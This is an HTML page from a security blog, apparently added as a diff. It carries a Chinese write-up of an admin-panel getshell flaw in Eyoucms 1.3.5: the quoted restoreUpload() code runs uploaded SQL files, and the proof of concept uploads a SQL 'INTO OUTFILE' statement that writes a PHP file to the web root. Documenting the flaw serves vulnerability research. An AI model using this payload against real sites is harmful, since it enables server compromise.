@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Eyoucms 1.3.5 后台getshell一、漏洞简介最新版本删除该功能二、漏洞影响Eyoucms 1.3.5 三、复现过程漏洞分析相关功能代码在application&#x2F;admin&#x2F;controller&#x2F;Tools.php  public function restoreUpload()  &amp;#123;      $file &#x3D; request()-&gt;file(&#39;sqlfile">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Eyoucms 1.3.5 后台getshell一、漏洞简介最新版本删除该功能二、漏洞影响Eyoucms 1.3.5 三、复现过程漏洞分析相关功能代码在application&#x2F;admin&#x2F;controller&#x2F;Tools.php  public function restoreUpload()  &amp;#123;      $file &#x3D; request()-&gt;file(&#39;sqlfile">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.3.5%E5%90%8E%E5%8F%B0getshell/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Eyoucms1.3.5%E5%90%8E%E5%8F%B0getshell/media/rId28.png">
+<meta property="article:published_time" content="2022-07-08T06:25:55.951Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Eyoucms1.3.5%E5%90%8E%E5%8F%B0getshell/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Eyoucms/Eyoucms 1.3.5 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.951Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Eyoucms-1-3-5-后台getshell"><a href="#Eyoucms-1-3-5-后台getshell" class="headerlink" title="Eyoucms 1.3.5 后台getshell"></a>Eyoucms 1.3.5 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="最新版本删除该功能"><a href="#最新版本删除该功能" class="headerlink" title="最新版本删除该功能"></a>最新版本删除该功能</h3><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Eyoucms 1.3.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>相关功能代码在<code>application/admin/controller/Tools.php</code></p>
+<pre><code> public function restoreUpload()
+ &#123;
+     $file = request()-&gt;file(&#39;sqlfile&#39;);
+     if(empty($file))&#123;
+         $this-&gt;error(&#39;请上传sql文件&#39;);
+     &#125;
+     // 移动到框架应用根目录/data/sqldata/ 目录下
+     $path = tpCache(&#39;global.web_sqldatapath&#39;);
+     $path = !empty($path) ? $path : config(&#39;DATA_BACKUP_PATH&#39;);
+     $path = trim($path, &#39;/&#39;);
+     $image_upload_limit_size = intval(tpCache(&#39;basic.file_size&#39;) * 1024 * 1024);
+     $info = $file-&gt;validate([&#39;size&#39;=&gt;$image_upload_limit_size,&#39;ext&#39;=&gt;&#39;sql,gz&#39;])-&gt;move($path, $_FILES[&#39;sqlfile&#39;][&#39;name&#39;]);
+     if ($info) &#123;
+         //上传成功 获取上传文件信息
+         $file_path_full = $info-&gt;getPathName();
+         if (file_exists($file_path_full)) &#123;
+             $sqls = Backup::parseSql($file_path_full);
+             if(Backup::install($sqls))&#123;
+                //array_map(&quot;unlink&quot;, glob($path));
+                 /*清除缓存*/
+                 delFile(RUNTIME_PATH);
+                 /*--end*/
+                 $this-&gt;success(&quot;执行sql成功&quot;, url(&#39;Tools/restore&#39;));
+             &#125;else&#123;
+                 $this-&gt;error(&#39;执行sql失败&#39;);
+             &#125;
+         &#125; else &#123;
+             $this-&gt;error(&#39;sql文件上传失败&#39;);
+         &#125;
+     &#125; else &#123;
+         //上传错误提示错误信息
+         $this-&gt;error($file-&gt;getError());
+     &#125;
+ &#125;
+</code></pre>
+<p>上传过程中只验证了文件的大小和后缀，之后解析sql语句并执行。解析sql函数不再贴出，但并没有检测文件内容正常的sql语句都能通过解析。install函数直接执行了sql语句。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>登陆后台在<code>高级选项-&gt;备份还原-&gt;数据还原</code>可选择上传sql文件并执行</p>
+<p><img src="/resource/Eyoucms1.3.5%E5%90%8E%E5%8F%B0getshell/media/rId27.png"></p>
+<p>上传sql文件内容为（需要知道网站绝对路径）</p>
+<pre><code> select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;D:\\tools\\phpstudy\\phpstudy_pro\\WWW\\testcms\\1.php&#39;;
+</code></pre>
+<p>上传成功后在网站根目录生成webshell。</p>
+<p><img src="/resource/Eyoucms1.3.5%E5%90%8E%E5%8F%B0getshell/media/rId28.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Eyoucms/Eyoucms%201.3.5%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qonv006gy8v17gtl4dpi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Eyoucms/Eyoucms%201.0%20%E5%89%8D%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
